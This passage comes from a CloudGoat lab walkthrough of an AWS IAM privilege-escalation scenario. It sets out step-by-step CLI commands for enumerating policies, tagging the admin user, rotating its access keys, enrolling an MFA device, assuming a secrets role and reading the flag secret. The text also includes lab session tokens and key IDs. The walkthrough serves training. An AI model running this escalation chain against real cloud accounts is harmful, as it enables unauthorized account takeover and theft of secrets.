   Policy have IAM actions to perform CRUD on MFA devices and access keys. Performing CRUD actions require **ResourceTag/Developer == TRUE**
   ![](images/iam_privesc_by_key_rotation/image3.png)

**TagResources**
   ```
   aws --profile manager iam get-user-policy --user-name manager_iam_privesc_by_key_rotation_cgidm3vx44qe91 --policy-name TagResources
   ```
   Policy have IAM actions to perform CRUD on tags.
   ![](images/iam_privesc_by_key_rotation/image4.png)
3. Enumerate all users
   ```
   aws iam list-users --profile manager
   ```
   A total of 3 users (excluding myself) was found.
   * Admin
   * Manager
   * Developer
   
   ![](images/iam_privesc_by_key_rotation/image5.png)
   
4. Enumerate Admin user
Check Admin policy
   ```
   aws iam list-attached-user-policies --user-name admin_iam_privesc_by_key_rotation_cgidm3vx44qe91 --profile manager
   ```
   Attached User Policy: Admin only have **IAMReadOnlyAccess**
   ![](images/iam_privesc_by_key_rotation/image6.png)
   Check user policy
   ```
   aws --profile manager iam list-user-policies --user-name admin_iam_privesc_by_key_rotation_cgidm3vx44qe91
   ```
   User Policy: Admin can **AssumeRoles**
   ![](images/iam_privesc_by_key_rotation/image7.png)
   Check **AssumeRoles** action:
   ```
   aws --profile manager iam get-user-policy --user-name admin_iam_privesc_by_key_rotation_cgidm3vx44qe91 --policy-name AssumeRoles
   ```
   A resource is tagged to action. This is tagged to another role **secretsmanager**
   ![](images/iam_privesc_by_key_rotation/image8.png)
   Check **secretsmanager** role
   ```
   aws --profile manager iam get-role --role-name cg_secretsmanager_iam_privesc_by_key_rotation_cgidm3vx44qe91
   ```
   **MultiFactorAuthPresent** needs to be true to use **AssumeRole**
   ![](images/iam_privesc_by_key_rotation/image9.png)
   
5. Enumerate secretsmanager role
Check role policies
   ```
   aws iam list-attached-role-policies --role-name cg_secretsmanager_iam_privesc_by_key_rotation_cgidm3vx44qe91 --profile manager
   ```
   PolicyName and ARN was given
   ![](images/iam_privesc_by_key_rotation/image10.png)
   Check policy by policyARN
   ```
   aws iam get-policy --policy-arn arn:aws:iam::536697256593:policy/cg_view_secrets_iam_privesc_by_key_rotation_cgidm3vx44qe91 --profile manager
   ```
   Policy details and version is given
   ![](images/iam_privesc_by_key_rotation/image11.png)
   List all policy actions by version
   ```
   aws iam get-policy-version --policy-arn arn:aws:iam::536697256593:policy/cg_view_secrets_iam_privesc_by_key_rotation_cgidm3vx44qe91 --version-id v1
   ```
   **secretsmanager** can **ListSecrets** and **GetSecretValue**
   ![](images/iam_privesc_by_key_rotation/image12.png)

6. Enumerate developer user
Check attached policies
   ```
   aws iam list-attached-user-policies --user-name developer_iam_privesc_by_key_rotation_cgidm3vx44qe91 --profile manager
   ```
   Result: None
   ![](images/iam_privesc_by_key_rotation/image13.png)
   Check user policies
   ```
   aws --profile manager iam list-user-policies --user-name developer_iam_privesc_by_key_rotation_cgidm3vx44qe91
   ```
   Result: **DeveloperViewSecrets**
   ![](images/iam_privesc_by_key_rotation/image14.png)
   Check **DeveloperViewSecrets** actions
   ```
   aws --profile manager iam get-user-policy --user-name developer_iam_privesc_by_key_rotation_cgidm3vx44qe91 --policy-name DeveloperViewSecrets
   ```
   Result: Allow **ListSecrets**
   ![](images/iam_privesc_by_key_rotation/image15.png)

7. Here are the information we have gathered thus far
* Manager can modify tags without condition
* Manager can modify MFA devices and access key if **developer** tag  == **true**
* Admin can assume role if **MFA** == **true**
* Developer has a role **secretsmanager** that allows viewing of secrets
As such, we can formulate an attack plan.
Manager will add **developer** tag to admin → Manager create new access key for admin → Manager create MFA for admin → Using Admin, assume **secretsmanager** role → Get secrets  

8. Starting with the first step, let's add **developer** tag to admin user.
   ```
   aws iam tag-user --user-name admin_iam_privesc_by_key_rotation_cgidm3vx44qe91 --tags '{"Key":"developer","Value":"true"}' --profile manager
   ```
9. Create access key for **admin** user
   ```
   aws iam create-access-key --user-name admin_iam_privesc_by_key_rotation_cgidm3vx44qe91 --profile manager
   ```
   However, there's an error stating that 2 existing keys are in place
   ![](images/iam_privesc_by_key_rotation/image16.png)
   List all access keys
   ```
   aws iam list-access-keys --user-name admin_iam_privesc_by_key_rotation_cgidm3vx44qe91 --profile manager
   ```
   Result: 2 existing keys were found
   
   ![](images/iam_privesc_by_key_rotation/image17.png)
   Delete 1 of the access key
   ```
   aws iam delete-access-key --user-name admin_iam_privesc_by_key_rotation_cgidm3vx44qe91 --access-key-id AKIAXZ5NGHKIV3ZJ7HPP --profile manager
   ```
   Create a new access key for admin user
   ```
   aws iam create-access-key --user-name admin_iam_privesc_by_key_rotation_cgidm3vx44qe91 --profile manager
   ```
   Result: New access key and secret access key for admin user
   ![](images/iam_privesc_by_key_rotation/image18.png)

10. Next, add MFA for admin user
   ```
   aws iam create-virtual-mfa-device --virtual-mfa-device-name cloudgoat_virtual_mfa --outfile QRCode.png --bootstrap-method QRCodePNG --profile manager
   ```
   Result: A MFA serial number is formed. A QR code is generated in the same file path
   ![](images/iam_privesc_by_key_rotation/image19.png)
   Scan the TOTP using an authenticator app an insert the OTP
   ```
   aws --profile manager iam enable-mfa-device \
       --user-name admin_iam_privesc_by_key_rotation_cgidm3vx44qe91 \
       --serial-number arn:aws:iam::536697256593:mfa/cloudgoat_virtual_mfa \
       --authentication-code1 594489 \
      --authentication-code2 680484
   ```
11. Configure admin user 
   ```
   Aws configure --profile admin
   ```
   ![](images/iam_privesc_by_key_rotation/image20.png)

12. Using admin, assume **secretsmanager** role
   ```
   aws --profile admin sts assume-role --role-arn arn:aws:iam::536697256593:role/cg_secretsmanager_iam_privesc_by_key_rotation_cgidm3vx44qe91 --role-session-name developer --serial-number arn:aws:iam::536697256593:mfa/cloudgoat_virtual_mfa --token-code 398592
   ```
   Result: Access keys are given
   ![](images/iam_privesc_by_key_rotation/image21.png)

13. Configure **developer** profile with **secretsmanager** role using the given access keys
   ```
   aws configure --profile developer
   ```
   Set session token
   ```
   aws configure set aws_session_token FwoGZXIvYXdzEDMaDNm5P4HVU6ThZjrKoiKtARievSSntgJBaBSpBruILnYHoFkunF3Nc2SrvDtpezvoeKFExsUoJS11Is3AabFUC6bmNxcNrPu02INC3pRYWkPo/UevMCc7OMkt4ORPuIryFs2ugQV/o2WnaDbtjV6ajx5yV8Vni4A7Xtt59icujbHWoIV3vzKbDelD4Pe+36NzF+iy2YHbTCKCdcxIwpq15YLNiGONm+pQwg2SDzG3XYTwugwsSrLzkw8wNm1eKNTo0rwGMi2khoqANlYM6FUnkjPCbAWsP379l0WqCX45VHCfEYlHmuOCdTh/mVc/XEAw7i4= --profile developer
   ```

14. List secrets
   ```
   aws secretsmanager list-secret --profile developer
   ```
   Result: View list of secrets
   ![](images/iam_privesc_by_key_rotation/image22.png)
   Get secrets value
   ```
   aws secretsmanager get-secret-value --profile developer --secret-id arn:aws:secretsmanager:us-east-1:536697256593:secret:cg_secret_iam_privesc_by_key_rotation_cgidm3vx44qe91-
   71BGjx
   ```
   Result: Flag found
   ![](images/iam_privesc_by_key_rotation/image23.png)

   
#### Root Cause
- Insufficient access control for users and roles


## Disclaimer

CloudGoat is software that comes with absolutely no warranties whatsoever. By using CloudGoat, you take full responsibility for any and all outcomes that result.
